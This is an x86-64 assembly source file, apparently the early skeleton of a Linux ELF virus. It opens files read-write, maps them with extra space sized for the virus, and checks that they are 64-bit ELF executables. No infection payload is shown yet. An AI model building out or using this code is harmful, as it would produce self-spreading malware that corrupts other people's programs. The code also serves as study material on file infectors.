section .text
	global _treat_file
	global _final_end

_file_size:
	enter 24, 0
	xor rax, rax
	mov rax, 8
	mov rsi, 0
	mov rdx, 0
	syscall
	mov rax, 8
	mov rsi, 0
	mov rdx, 2
	syscall
	mov QWORD [rsp], rax
	mov rax, 8
	mov rsi, 0
	mov rdx, 0
	syscall
	mov rax, QWORD [rsp]
	leave
	ret

_treat_file:
	enter 64, 0 ; equal to push rbp - mov rbp, rsp - sub rsp, 16
				; sub 8 bytes for mmap return address
				; sub 8 bytes for file size
				; sub 8 bytes for virus size
				; sub 8 bytes for fd
	cmp rdi, 0
	je _final_end
	mov QWORD [rsp + 8], rsi
;;;;;;;;;;;;;;;;;
; open file
	mov rax, 2
	mov rsi, 2
	xor rdx, rdx
	syscall
	cmp rax, -1
	jle _final_end
	mov QWORD [rsp], rax ; store the fd
	mov rdi, rax
	call _file_size
	mov QWORD [rsp + 16], rax ; store file size
;;;;;;;;;;;;;;;;;
; mmap file
	mov rax, 9
	mov rdi, 0
	mov rsi, QWORD [rsp + 16]
	add rsi, QWORD [rsp + 8]
	add rsi, 8
	mov rdx, 3
	mov r10, 2
	mov r8, QWORD [rsp]
	mov r9, 0
	syscall
	cmp rax, 0
	jle _final_end
	mov QWORD [rsp + 24], rax

_read_file_header_64:
;;;;;;;;;;;;;;;;;
; read the header from file, if it has one (64 bytes)
;	xor rax, rax
;	mov rdi, QWORD [rsp + 4096]
;	mov rsi, rsp
;	mov rdx, 64
;	syscall
;	cmp rax, 64  ; if their is less than 64 bytes readed, then the file is not a binary
;	jl _final_end
;; check magic number
	mov rdi, [rsp + 24]
	cmp DWORD [rdi], 0x464c457f
	jne _final_end
;; check class file (only 64 bits are treated)
	cmp BYTE [rdi + 4], 2
	jne _final_end
;; check the file type, only exec files are treated
	cmp WORD [rdi + 16], 2
	jne _final_end
;;;;;;;;;;;;;;;;;;;;;;;;
;; just print string for debug, will not appear in final version
	push 0x000a6b6f
	mov rax, 1
	mov rdi, 1
	mov rsi, rsp
	mov rdx, 3
	syscall
	pop rdi
;;;;;;;;;;;;;;;;;;;;;;;;
; munmap
_munmap:
	mov rax, 11
	mov rdi, QWORD [rsp + 24]
	mov rsi, QWORD [rsp + 16]
	add rsi, QWORD [rsp + 8]
	add rsi, 8
	syscall
;;;;;;;;;;;;;;;;;;;;;;;;
; close file
	mov rax, 3
	mov rdi, QWORD [rsp]
	syscall

_final_end:
	leave
	ret
